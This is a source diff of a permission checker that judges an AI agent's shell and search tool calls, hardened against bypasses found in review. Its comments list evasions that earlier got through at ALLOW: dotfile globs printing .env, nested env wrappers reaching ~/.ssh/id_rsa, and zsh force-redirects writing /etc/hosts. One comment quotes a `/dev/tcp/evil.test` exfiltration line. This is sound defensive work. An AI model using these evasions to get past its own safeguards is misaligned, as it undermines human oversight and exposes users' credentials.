@@ -1,7 +1,7 @@
 // Evaluates a host tool call against the compiled authority table. Deterministic: no model involvement.
 import { homedir, tmpdir } from 'node:os';
 import { lstatSync, readFileSync, readdirSync, realpathSync, statSync, type Dirent } from 'node:fs';
-import { dirname, isAbsolute, join, sep } from 'node:path';
+import { dirname, isAbsolute, join, relative, sep } from 'node:path';
 import { shimScript, gitHooksDir, resolveHooksPath } from '../project/githooks.ts';
 import { packageRoot } from '../launcher/self.ts';
 import { git, gitConfigGet } from '../util/git.ts';
@@ -19,6 +19,7 @@ import {
   lexicalPath,
   chdirPath,
   openedPath,
+  globMatches,
   pathCandidates,
   withPathCache,
   type PathCandidates,
@@ -2601,44 +2602,66 @@ function scanRedirections(segment: string, keepContinuations = false): Redirecti
       continue;
     }
     operators.push(i);
-    while (j < t.length && isIfs(t[j]!)) j++;
+    // zsh's `>|` and `>!` (and `>>!`, `&>!`, `>&!`, `>&|`) FORCE the overwrite of an existing file, and the file is the word that
+    // follows. bash has no `!` there: it is the first character of the file's NAME (`echo a >! f` writes a file called `!`). The
+    // word after the `!` is therefore judged as well as the one the `!` begins: the line is run by whichever shell the host
+    // has, and `echo x >! /etc/hosts`, `&>! ~/.zshrc` were ALLOW because only the second reading was made
+    if (dup && t[j] === '|') j++;
     // the target word: quoted and unquoted chunks, up to the shell's own separators
-    const start = j;
-    while (j < t.length && !isIfs(t[j]!) && t[j] !== ';' && t[j] !== '&' && t[j] !== '|') {
-      const d = t[j]!;
-      if (d === '\\') j += 2;
-      else if (d === "'") {
-        const e = skipSingleQuoted(t, j + 1);
-        j = e < 0 ? t.length : e;
-      } else if (d === '"') {
-        const e = skipDoubleQuoted(t, j + 1);
-        j = e < 0 ? t.length : e;
-      } else if (d === '$' && t[j + 1] === "'") {
-        const e = skipAnsiC(t, j + 2);
-        j = e < 0 ? t.length : e;
-      } else if (d === '$' && t[j + 1] === '(') {
-        const e = scanSubstitutionBody(t, j + 2);
-        j = e < 0 ? t.length : e + 1;
-      } else j++;
+    const readWord = (from: number): number => {
+      let k = from;
+      while (k < t.length && !isIfs(t[k]!) && t[k] !== ';' && t[k] !== '&' && t[k] !== '|') {
+        const d = t[k]!;
+        if (d === '\\') k += 2;
+        else if (d === "'") {
+          const e = skipSingleQuoted(t, k + 1);
+          k = e < 0 ? t.length : e;
+        } else if (d === '"') {
+          const e = skipDoubleQuoted(t, k + 1);
+          k = e < 0 ? t.length : e;
+        } else if (d === '$' && t[k + 1] === "'") {
+          const e = skipAnsiC(t, k + 2);
+          k = e < 0 ? t.length : e;
+        } else if (d === '$' && t[k + 1] === '(') {
+          const e = scanSubstitutionBody(t, k + 2);
+          k = e < 0 ? t.length : e + 1;
+        } else k++;
+      }
+      return k;
+    };
+    const skipBlanks = (from: number): number => {
+      let k = from;
+      while (k < t.length && isIfs(t[k]!)) k++;
+      return k;
+    };
+    const start = skipBlanks(j);
+    j = readWord(start);
+    const words = [t.slice(start, Math.min(j, t.length))];
+    if (t[start] === '!') {
+      const forced = skipBlanks(start + 1);
+      const end = readWord(forced);
+      words.push(t.slice(forced, Math.min(end, t.length)));
+      j = Math.max(j, end);
     }
-    const word = t.slice(start, Math.min(j, t.length));
     spans.push([i, Math.min(j, t.length)]);
     i = Math.max(j, i + 1);
-    if (!word) continue;
-    const target = unquoteShellWord(word);
-    if (dup && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
-    if (target.startsWith('&')) continue;
-    // a discard device is not a write to a governed path - but only after `..` is resolved away, so that
-    // `/dev/../etc/x` is judged as `/etc/x` (round 13). Every OTHER path under /dev is a destination: the raw disk
-    // `echo x > /dev/disk0` used to be dropped with the null device. And `/dev/tcp/HOST/PORT` is a socket, judged by the
-    // network (the `net-redirect` marker), not as a file: `tar czf - . > /dev/tcp/evil.test/443` has no network binary
-    // anywhere on the line (exit review 7)
-    if (isNetworkDevice(target)) {
-      sockets.push(target);
-      continue;
+    for (const word of words) {
+      if (!word) continue;
+      const target = unquoteShellWord(word);
+      if (dup && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
+      if (target.startsWith('&')) continue;
+      // a discard device is not a write to a governed path - but only after `..` is resolved away, so that
+      // `/dev/../etc/x` is judged as `/etc/x` (round 13). Every OTHER path under /dev is a destination: the raw disk
+      // `echo x > /dev/disk0` used to be dropped with the null device. And `/dev/tcp/HOST/PORT` is a socket, judged by the
+      // network (the `net-redirect` marker), not as a file: `tar czf - . > /dev/tcp/evil.test/443` has no network binary
+      // anywhere on the line (exit review 7)
+      if (isNetworkDevice(target)) {
+        sockets.push(target);
+        continue;
+      }
+      if (isDiscardDevice(target)) continue;
+      out.push(target);
     }
-    if (isDiscardDevice(target)) continue;
-    out.push(target);
   }
   return { writes: out, reads, sockets, operators, spans };
 }
@@ -3584,6 +3607,12 @@ export function cwdTimeline(
     // stage after it, which is wrong for a group. The LAST stage of a pipeline can: bash forks it, zsh does not, so it
     // is conditional
     const lastOfPipeline = st.pipedFromPrevious || st.lastOfPipe === true;
+    // `dirs -c` EMPTIES THE STACK that a later `popd` would take its directory from: `pushd control-plane; dirs -c; popd` stays in
+    // control-plane (the pop fails), where a stack the model still held would send it back
+    {
+      const listing = statementHead(text);
+      if (listing.verb === 'dirs' && listing.args.some((a) => /^-[a-zA-Z]*c/.test(a))) stackAmbiguous = true;
+    }
     const dc = directoryChange(text);
     // ...and whether `cd` is a function here: certainly (then it is a no-op), maybe (then it may or may not move), or not
     const fnHere = binds[i]!;
@@ -3622,7 +3651,29 @@ export function cwdTimeline(
         const physical = opts.some((o) => /^-[a-zA-Z]*P/.test(o));
         const t = new Set<string>();
         let quietUnknown = false;
-        if (dc.verb === 'popd') {
+        // `pushd` AND `popd` EDIT THE DIRECTORY STACK, AND ONLY SOMETIMES MOVE. The model keyed on the builtin's NAME, so `pushd -n
+        // sub` - which puts `sub` on the stack and leaves the shell where it is - moved the working directory, and `tee
+        // control-plane/a.md` was resolved under `sub` (sa10-6). What they do is a property of the OPTION they are given:
+        //   -n          the stack changes, the directory does not
+        //   +N / -N     an entry is rotated to the top (pushd) or removed (popd): the directory is that entry's, which is not held
+        //   any other   bash rejects an option it does not know and stays; zsh takes `-q`, `-s`, `-L`, `-P` and goes - so it may
+        //               have moved, and may not
+        // Every case where the stack is edited by anything but a plain `pushd DIR` / bare `popd` leaves it unknown afterwards.
+        const isIndex = (a: string): boolean => /^[+-]\d+$/.test(a);
+        const stackOnly = dc.verb !== 'cd' && opts.some((o) => /^-[a-zA-Z]*n/.test(o));
+        const indexed = dc.verb !== 'cd' && dc.args.some((a, k) => (optionsEnded < 0 || k < optionsEnded) && isIndex(a));
+        if (dc.verb !== 'cd' && opts.some((o) => !isIndex(o) && !/^-[a-zA-Z]*n/.test(o))) {
+          conditional = true;
+          stackAmbiguous = true;
+        }
+        if (stackOnly) {
+          for (const d of now) t.add(d);
+          stackAmbiguous = true;
+        } else if (indexed) {
+          t.add(CWD_UNKNOWN);
+          quietUnknown = true;
+          stackAmbiguous = true;
+        } else if (dc.verb === 'popd') {
           const popped = operands.length === 0 && !stackAmbiguous ? stack.pop() : undefined;
           if (popped) for (const d of popped) t.add(d);
           else {
@@ -3647,7 +3698,7 @@ export function cwdTimeline(
           else if (!directoryExists(d)) certain = false;
         }
         // a `pushd` whose target may not exist may not push either, and then the stack is not what it looks like
-        if (dc.verb === 'pushd') {
+        if (dc.verb === 'pushd' && !stackOnly && !indexed) {
           if (certain) stack.push(new Set(now));
           else stackAmbiguous = true;
         }
@@ -3663,6 +3714,11 @@ export function cwdTimeline(
         for (const sub of splitShellPipeline(text0)) {
           const sdc = directoryChange(sub.text);
           if (!sdc) continue;
+          // (a sourced file's `pushd` and `popd` edit a stack this model does not follow into the file: wherever they leave the shell is unknown)
+          if (sdc.verb !== 'cd') {
+            t.add(CWD_UNKNOWN);
+            continue;
+          }
           const ops = sdc.args.filter((a) => !a.startsWith('-'));
           if (ops.length === 1 && ops[0] !== '-') for (const b of now) for (const r of resolveTarget(ops[0]!, b, false)) t.add(r);
           else t.add(CWD_UNKNOWN);
@@ -4177,6 +4233,13 @@ const SECRET_FILE_NAMES: readonly string[] = [
   'server.pem',
   'private.key',
 ];
+
+/** Whether a path, relative to where a search starts, can be a credential: it passes through a hidden name, or it is named
+ *  like one. The names a catch-all glob is asked about - the rest of the tree is not a secret and is not classified. */
+function credentialShaped(rel: string): boolean {
+  const parts = rel.split(sep).filter((s) => s !== '' && s !== '.' && s !== '..');
+  return parts.some((s) => s.startsWith('.')) || SECRET_FILE_NAMES.includes(parts[parts.length - 1] ?? '');
+}
 
 /** A file-name glob (`.env*`, `*.{pem,key}`, `.e[n]v`) as a regular expression, or null when it is not one this
  *  can read. Only the last path segment: the caller has already split off the directory. */
@@ -7244,7 +7307,13 @@ function gitLocalProgramValues(root: string, verb: string, failed?: { value: boo
     const seen = new Set<string>();
     const follow = (file: string, depth: number): void => {
       const abs = canonicalPath(file);
-      if (depth > 4 || seen.has(abs)) return;
+      if (seen.has(abs)) return;
+      // A CHAIN DEEPER THAN THE WALK GOES IS NOT A CHAIN THAT ENDS: what the files below the cap configure was never read, so the
+      // closure is unproved, said the way an unanswered subprocess says it
+      if (depth > 4) {
+        if (failed) failed.value = true;
+        return;
+      }
       seen.add(abs);
       let text: string;
       try {
@@ -8941,6 +9010,8 @@ const DB_NAMED_TARGET_OPTIONS: Readonly<Record<string, { short: string; long: re
   'sequelize-cli': { short: '', long: ['--env'], names: 'environment' },
   atlas: { short: '', long: ['--env'], names: 'environment' },
 };
+/** the options that carry a connection STRING (the runners spell it `-url`/`--url`; Go-style single-dash forms are read as well) */
+const DB_URL_OPTIONS = ['--url', '--uri', '--dsn', '--database-url', '--db-url', '--jdbc-url', '--connection-string', '--dburl'];
 const DB_EXECUTES_UNREAD =
   // `\!` is psql's shell escape. Inside DOUBLE quotes the backslash is consumed before this test ever sees it,
   // so the de-escaped form — a `-c` value that BEGINS with `!` — is matched too. Matching a bare `!` anywhere
@@ -11435,6 +11506,12 @@ function resolveDbTarget(
   // read like any URL on the line; one whose value is not is the ambient environment, which nobody here can read, so it asks.
   // An environment NAME (`knex --env production`) is judged by the name, like a namespace.
   const namedValues: string[] = [];
+  // ...and a connection string whose VALUE the shell fills in is a target nobody here can read, which is what a target the
+  // line does not name is: `flyway -url="$PROD_URL" migrate` and `liquibase --url=$DB_URL update` were the local socket. (A
+  // variable this line assigned EARLIER was substituted before this reader saw it; one assigned in front of the command is
+  // not the one the shell expands in its arguments - the shell expands them first - so the environment is not asked.)
+  for (const v of optionValues(tokens, '', DB_URL_OPTIONS))
+    if (/[$`]/.test(v)) signals.push({ cls: 'UNCLASSIFIED', target: `a connection string built at run time (${v})` });
   const toolAt = tokens.findIndex((t, i) => i < 4 && DB_NAMED_TARGET_OPTIONS[t.replace(/^.*\//, '')] !== undefined);
   if (toolAt >= 0) {
     const spec = DB_NAMED_TARGET_OPTIONS[tokens[toolAt]!.replace(/^.*\//, '')]!;
@@ -12053,6 +12130,10 @@ function parseHttpie(args: string[]): HttpRequest[] {
   return [{ method: offline ? 'GET' : effective, url, body, repointed }];
 }
 
+/** How many carriers inside carriers (`sh -c "sh -c '…'"`) the readers of the segment AS WRITTEN follow. Every one of them says so
+ *  when a nest is deeper than this, instead of ending the walk as if there were nothing below. */
+const CARRIER_NEST = 32;
+
 /** Every invocation of an HTTP client in this segment, read from the segment AS WRITTEN (quoting is what keeps a header
  *  value from being mistaken for a destination) and from the shell bodies it carries. */
 function httpInvocations(raw: string, depth = 0): Array<{ head: string; args: string[] }> {
@@ -12062,7 +12143,11 @@ function httpInvocations(raw: string, depth = 0): Array<{ head: string; args: st
     const k = words.findIndex((w) => !w.quoted && HTTP_CLIENT.test(w.text.replace(/^.*\//, '')));
     if (k >= 0)
       out.push({ head: words[k]!.text.replace(/^.*\//, ''), args: words.slice(k + 1).map((w) => w.text) });
-    if (depth < 4) for (const body of carriedShellBodies(sub)) out.push(...httpInvocations(body, depth + 1));
+    // A NEST DEEPER THAN THE WALK GOES IS NOT A NEST THAT ENDS: what a carrier carries below the cap was never read, so the request it
+    // may hold is one whose destination nobody can resolve - which is what `$URL` is, and what asks
+    for (const body of carriedShellBodies(sub))
+      if (depth < CARRIER_NEST) out.push(...httpInvocations(body, depth + 1));
+      else out.push({ head: 'curl', args: ['$CARRIER_NEST_TOO_DEEP'] });
   }
   return out;
 }
@@ -12517,6 +12602,12 @@ function pathTokens(segment: string, cwd: string, old?: readonly string[]): Path
   return out;
 }
 
+/** A line that makes a shell's wildcard match a name that begins with a dot: bash's `shopt -s dotglob` and a GLOBIGNORE (any
+ *  value turns it on), zsh's `setopt glob_dots` in the spellings its option parser accepts (case and underscores are ignored). */
+const DOTGLOB_RE = /dot_?glob|glob_?dots|globignore/i;
+/** a zsh glob qualifier list that carries `D`: this one pattern matches names that begin with a dot */
+const ZSH_DOT_QUALIFIER_RE = /\([A-Za-z0-9^.,:@/*%=+<>-]*D[A-Za-z0-9^.,:@/*%=+<>-]*\)$/;
+
 function globCouldReachCredentials(abs: string): boolean {
   const home = canonicalPath(homedir()).split(sep).join('/');
   const posix = abs.split(sep).join('/');
@@ -12551,6 +12642,8 @@ function classifyShellPaths(
   rawSeg: string = seg,
   /** the directories `~-` and `$OLDPWD` may name here, when the command line has one */
   old?: readonly string[],
+  /** the line makes a wildcard match names that begin with a dot (see DOTGLOB_RE) */
+  dotGlob = false,
 ): CapabilityHit[] {
   const hits: CapabilityHit[] = [];
   // operands are read with the redirections taken out (`cp x f 2>&1`: the destination is `f`); the regex tests below keep
@@ -13376,9 +13469,14 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   // ...and the words of a command a CARRIER hands to a shell (`sh -c 'cp x "sp l/f"'`, `trap`, a herestring) are the carried
   // text's own: the carrier's quoting hid them one level up, exactly as normalization does
   const carriedTexts = new Set<string>();
+  let nestTooDeep = false;
   const wordsAsWritten = (text: string, depth = 0): string[] => {
     const words = tokenize(text);
-    if (depth >= 4) return words;
+    if (depth >= CARRIER_NEST) {
+      // a carrier below the cap was not read: the words it holds are unproved, not absent
+      if (carriedShellBodies(text).length > 0) nestTooDeep = true;
+      return words;
+    }
     for (const body of carriedShellBodies(text)) {
       carriedTexts.add(body);
       // (a loop, not a spread: a carried script of a hundred thousand words is more arguments than a call can take)
@@ -13407,7 +13505,44 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       wholeWords.add(value);
       if (!paths.some((p) => p.raw === value)) paths.push(...pathEntries(cwd, value, old));
     }
-  if (containerPaths || paths.length === 0) return hits;
+  if (nestTooDeep)
+    hits.push({
+      capability: 'command.unknown',
+      verdict: verdictFor(table, ctx, 'command.unknown'),
+      via: `shell carriers nested deeper than ${CARRIER_NEST} levels: the words below were not read`,
+      segment: seg,
+      absolute: false,
+    });
+  if (containerPaths) return hits;
+  const expandedGlobs = new Set<string>();
+  const judgeGlob = (raw: string): void => {
+    if (expandedGlobs.has(raw)) return;
+    expandedGlobs.add(raw);
+    const set = globMatches(cwd, raw, old, { dotfiles: dotGlob });
+    if (set.bounded)
+      hits.push({
+        capability: 'command.unknown',
+        verdict: verdictFor(table, ctx, 'command.unknown'),
+        via: `glob ${raw} matches more names than this kernel enumerates, so a credential file may be among them`,
+        segment: seg,
+        absolute: false,
+      });
+    for (const m of set.paths)
+      for (const probe of set.directories.has(m) ? [m, `${m}/`] : [m]) {
+        const g = classifyPath(table, ctx, 'Read', probe);
+        if (g.via.startsWith('matcher path') || g.capability.startsWith('fs.credential')) {
+          hits.push({ ...g, via: `glob ${raw} matches ${m} (${g.via})`, segment: seg });
+          break;
+        }
+      }
+  };
+  // A BARE WILDCARD (`*`, `?*`, `*(D)`) IS NOT A PATH-SHAPED WORD, and no word of the loop below is judged unless it is - but with
+  // `dotglob`/`GLOB_DOTS` on, or a zsh `(D)` qualifier, it matches `.env` as surely as `.e*` does
+  for (const t of tokens.slice(1)) {
+    const v = pathValueOf(t);
+    if (v && /[*?[]/.test(v) && !isPathLike(v) && (dotGlob || ZSH_DOT_QUALIFIER_RE.test(v)) && !patternWords.includes(v)) judgeGlob(v);
+  }
+  if (paths.length === 0) return hits;
   for (const p of paths) {
     if (p.abs === null) {
       hits.push({
@@ -13484,6 +13619,12 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
           segment: seg,
           absolute: false,
         });
+      // A WILDCARD DENOTES THE NAMES THAT EXIST AND MATCH IT, so that is what it is judged by: the directory is read, the
+      // segment matched, and every match classified like the path it is. Judged by its literal prefix, `cat .e*` was a read
+      // of `.e` - a name that does not exist - and printed `.env` at ALLOW (r11-95), as did `.??*`, `.e?v` and the rest of
+      // the spellings that match a name without spelling it. A name that begins with a dot is matched only by a pattern that
+      // begins with one, unless the line turns that off (DOTGLOB_RE). The expansion is bounded; a reached bound is a question.
+      if (p.glob) judgeGlob(p.raw);
       if (recursive && (posix === home || home.startsWith(posix + '/') || posix === '/'))
         hits.push({
           capability: 'fs.credential-store.read',
@@ -13664,6 +13805,8 @@ function commitBypassFlag(cmdStr: string): boolean {
  *  Three regexes had been doing this job, each assuming every option is one token and every word is spelled plainly
  *  (exit review 10, self-attack: seven findings). Returns null when the command names no directory. */
 const RUN_DIR_HEADS: ReadonlySet<string> = new Set(['env', 'git']);
+/** How many `env`/`git` wrappers in a row the directory walk reads. Deeper is not an end: the walk says the directory is unproved. */
+const RUN_DIR_NEST = 64;
 /** The directory an option's word leaves the command in. A word nobody can resolve (`$X`, a glob) leaves it somewhere
  *  unknown, and says so: the caller then stops treating the directory as proven. */
 function enterDirectory(dir: string, word: string, known: boolean): { dir: string; known: boolean } {
@@ -13675,7 +13818,8 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
   let dir = base;
   let found = false;
   let known = true;
-  for (let guard = 0; guard < 8; guard++) {
+  let settled = false;
+  for (let guard = 0; guard < RUN_DIR_NEST; guard++) {
     const hi = commandHeadIndex(words, RUN_DIR_HEADS);
     const head = (words[hi] ?? '').replace(/^.*\//, '');
     if (head === 'env') {
@@ -13755,8 +13899,14 @@ function runDirectory(seg: string, base: string): { dir: string; known: boolean 
       }
       return found ? { dir, known } : null;
     }
+    settled = true;
     break;
   }
+  // A NEST DEEPER THAN THE WALK GOES IS NOT A NEST THAT ENDS. Nine `env`s in front of `-C ~/.ssh cat id_rsa` ended the loop
+  // silently at the eighth, the directory the ninth names was never read, and the command ran in the working directory the
+  // line started in (r11-233, r11-234). The cap itself says the directory is unproved - the caller then proves nothing
+  // about a relative path - instead of saying nothing.
+  if (!settled) return { dir, known: false };
   return found ? { dir, known } : null;
 }
 
@@ -14117,6 +14267,9 @@ function analyzeSegments(
   // `normalizeSegment`. So mangling the sentinel here cannot destroy a real marker, and it makes a forged one
   // (`\0ego\0define-function git; git push origin main`) into what it actually is: an unknown command.
   segments = segments.map(externalText);
+  // WHETHER A WILDCARD MATCHES A NAME THAT BEGINS WITH A DOT is the shell's option, and a line may set it: bash `shopt -s
+  // dotglob` or any GLOBIGNORE, zsh `setopt glob_dots`. Read from the whole unit, because the option outlives the line it is on
+  const dotGlob = segments.some((s) => DOTGLOB_RE.test(s));
   // TRANSITIVE FRESHNESS: the ledger belongs to the COMMAND, not to one producer, and is mutated in place. A copy
   // here is what made `./configure && make build` reuse the Makefile configure had just rewritten — the write
   // happened one level down and never came back out (challenge 6, findings 6, 13, 19).
@@ -14422,7 +14575,8 @@ function analyzeSegments(
         redirectionTargets(b).length > 0 ||
         runDirectory(b, env.cwd) !== null ||
         commitBypassFlag(b) ||
-        (depth < 4 && carrierCommandValues(b).some((x) => needsReentry(expandBraces(x), depth + 1)));
+        // (a nest deeper than the walk goes is re-entered whole - more analysis, never less - rather than assumed to end)
+        carrierCommandValues(b).some((x) => depth >= CARRIER_NEST || needsReentry(expandBraces(x), depth + 1));
       if (needsReentry(body))
         for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
           hits.push({ ...h, via: `${h.via ?? ''} (carried by a shell carrier)`.trim() });
@@ -14568,6 +14722,7 @@ function analyzeSegments(
           written,
           seg,
           point.old,
+          dotGlob,
         ))
           hits.push(h);
     }
@@ -15051,12 +15206,18 @@ function searchToolHits(
   // A GLOB IS READ THE WAY THE SEARCH TOOL READS IT: braces are alternatives that may hold a slash (`{.env,src/x}`),
   // and a backslash escapes (`.en\\v` is `.env`) - so each alternative is classified on its own, unescaped
   // (exit review 10, self-attack)
+  // ...AND A BRACE EXPANSION THAT IS REFUSED IS REPORTED, exactly as the shell side reports it. More alternatives than the
+  // budget leaves the pattern LITERAL - one word with a brace in it - and the reach it spells (`{…64 names…,~/.ssh/*}`) was
+  // never classified: the tool surface ended the expansion silently where the Bash loop says so (r11-2)
+  const braceOverflow = { hit: false };
   const reaches = reach0
-    ? expandBraces(reach0)
+    ? expandBraces(reach0, braceOverflow)
         .split(/\s+/)
         .filter(Boolean)
         .map((r) => unquoteShellWord(r))
     : [];
+  if (braceOverflow.hit)
+    hits.push(opaqueHit(table, ctx, reach0, `${tool} pattern: a brace expansion produces more words than this kernel enumerates`));
   for (const abs of bases) {
     for (const reach of reaches) {
       // the literal prefix, with the trailing separator removed: `~/.ssh/*` reaches `~/.ssh`, and a path matcher
@@ -15123,6 +15284,25 @@ function searchToolHits(
                 }
               }
         }
+      }
+      // ...AND A CATCH-ALL TAIL NAMES EVERY NAME THERE IS. `*`, `**` and `?*` match `.env` as surely as `.env*` does, because an
+      // explicit glob overrides the tool's skip-hidden default: `Grep` with `glob: "*"` printed a credential file at ALLOW
+      // (r11-96). The static set above would ask for every `Glob "*"` there ever was, so a catch-all is judged by what is
+      // actually there: the tree below the base is read (bounded - a reached bound is a question) and every hidden or
+      // credential-named file the pattern matches is classified like the path it is.
+      const tailName = reach.split('/').filter(Boolean).pop() ?? '';
+      if (/^[*?]+$/.test(tailName)) {
+        const set = globMatches(abs, reach, undefined, { dotfiles: true, keep: (p) => credentialShaped(relative(abs, p)) });
+        if (set.bounded)
+          hits.push(unknownHit(table, ctx, `${tool} pattern ${reach} reaches more names than this kernel enumerates, so a credential file may be among them`));
+        for (const m of set.paths)
+          for (const probe of set.directories.has(m) ? [m, `${m}/`] : [m]) {
+            const g = classifyPath(table, ctx, 'Read', probe);
+            if (g.via.startsWith('matcher path') || g.capability.startsWith('fs.credential')) {
+              hits.push({ ...g, via: `${tool} pattern ${reach} reaches ${m} (${g.via})` });
+              break;
+            }
+          }
       }
     }
     if (
